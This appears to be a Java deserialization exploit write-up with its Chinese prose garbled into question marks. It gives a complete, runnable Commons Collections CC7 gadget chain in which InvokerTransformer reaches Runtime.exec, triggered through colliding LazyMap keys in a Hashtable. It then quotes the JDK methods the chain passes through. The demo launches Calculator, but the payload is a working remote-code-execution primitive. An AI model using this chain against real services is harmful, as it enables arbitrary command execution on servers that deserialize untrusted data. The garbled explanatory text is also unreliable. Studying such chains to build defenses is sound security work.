poc

```JAVA
package demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
public class CommonsCollections7 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        "/System/Applications/Calculator.app/Contents/MacOS/Calculator"),
                new ConstantTransformer(1)};
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        lazyMap2.remove("yy");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.close();
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.out"));
        objectInputStream.readObject();
    }
}
```

?????????????????????????????????

```java
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        "/System/Applications/Calculator.app/Contents/MacOS/Calculator"),
                new ConstantTransformer(1)};
```

?????????CC7??????Hashtable?????????????????????????????????lazyMap#get????????????hashtable???readObject??????

```java
    private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;

        Entry<K,V>[] newTable = new Entry[length];
        threshold = (int) Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;
        initHashSeedAsNeeded(length);

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            K key = (K)s.readObject();
            V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(newTable, key, value);
        }
        this.table = newTable;
    }
```

reconstitutionPut??????

```java
    private void reconstitutionPut(Entry<K,V>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = hash(key);
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<K,V> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        Entry<K,V> e = tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

??????e.key.equals????????????AbstractMap#??????

```JAVA
    public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<K,V> m = (Map<K,V>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
```

????????????map???????????????get???????????????????????????lazyMap#get

```java
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
```

??????hashtable put????????????????????????reconstitutionPut???????????????e.key.equals????????????put??????tab[index]???null,?????????if??????

![](./media/1.jpg)

???????????????tab????????????tab?????????

```java
        Entry<K,V> e = tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
```

????????????

![](./media/2.jpg)

??????put??????"yy"???"zZ"????????????e.hash ==hash??????????????????if??????????????????equals???

![](./media/3.png)

??????????????????put???????????????key????????????????????????????????????key??????lazyMap???get????????????????????????transform??????

```java
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
```

?????????????????????????????????lazyMap???remove("yy")?????????????????????????????????map?????????put????????????hashtable???put?????????????????????equals????????????lazyMap#put

```java
    public synchronized V put(K key, V value) {
        // Make sure the value is not null
        if (value == null) {
            throw new NullPointerException();
        }

        // Makes sure the key is not already in the hashtable.
        Entry tab[] = table;
        int hash = hash(key);
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<K,V> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                V old = e.value;
                e.value = value;
                return old;
            }
        }
```

??????lazyMap2???size????????????2?????????equals???????????????if??????????????????map???size????????????????????????false????????????remove???yy,????????????map???????????????1???key???????????????

```java
        if (m.size() != size())
            return false;
```

??????????????????????????????????????????????????????